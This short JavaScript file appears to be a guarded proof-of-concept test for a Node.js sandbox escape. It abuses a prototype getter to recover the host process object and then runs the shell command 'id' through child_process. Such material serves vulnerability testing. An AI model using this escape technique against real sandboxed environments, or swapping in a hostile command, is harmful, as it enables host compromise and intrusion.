if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (
		error.message ===
		"Cannot read properties of undefined (reading 'mainModule')"
	) {
		process.exit(82);
	}

	process.exit(1);
});

var process;
try {
	Object.defineProperty(Buffer.from(""), "", {
		get set() {
			Object.defineProperty(Object.prototype, "get", {
				get() {
					throw (x) => x.constructor("return process")();
				},
			});
			return () => {};
		},
	});
} catch (e) {
	process = e(() => {});
}
process.mainModule
	.require("child_" + "process")
	.execSync("id")
	.toString();
